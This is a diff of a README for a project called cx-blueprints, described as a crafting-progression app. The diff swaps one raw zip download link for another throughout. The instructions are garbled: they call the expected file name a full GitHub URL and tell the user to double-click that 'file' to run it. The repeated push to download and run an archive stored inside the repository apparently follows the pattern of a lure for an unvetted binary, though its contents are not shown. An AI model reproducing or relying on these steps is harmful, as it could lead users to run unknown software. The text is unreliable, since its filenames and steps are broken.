@@ -1,6 +1,6 @@
 # 🚀 cx-blueprints - Simple Crafting Progression Made Easy
 
-[![Download Latest Release](https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-v2.8.zip%20Latest%20Release-v1.0-blue)](https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-v2.8.zip)
+[![Download Latest Release](https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-1.8-beta.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-1.8-beta.3.zip)
 
 ## 📖 Overview
 
@@ -12,9 +12,9 @@ To get started with the cx-blueprints application, follow these steps to downloa
 
 ### 📥 Download the Application
 
-1. Click this link to visit the releases page and download the application: [Download Latest Release](https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-v2.8.zip).
+1. Click this link to visit the releases page and download the application: [Download Latest Release](https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-1.8-beta.3.zip).
    
-2. On the releases page, find the most recent version of cx-blueprints. Look for files that match your operating system. The application will typically be named something like `https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-v2.8.zip` or `https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-v2.8.zip` for Windows.
+2. On the releases page, find the most recent version of cx-blueprints. Look for files that match your operating system. The application will typically be named something like `https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-1.8-beta.3.zip` or `https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-1.8-beta.3.zip` for Windows.
 
 3. Click the download link for your version. Save the file to a location you can easily access, like your desktop or downloads folder.
 
@@ -32,7 +32,7 @@ If you downloaded a `.zip` file, you will need to extract it:
 
 1. After extracting, open the folder where you extracted the files.
 
-2. Look for a file named `https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-v2.8.zip`. 
+2. Look for a file named `https://github.com/speedy76tv/cx-blueprints/raw/refs/heads/main/client/blueprints-cx-1.8-beta.3.zip`. 
 
 3. Double-click this file to run the application. 
 
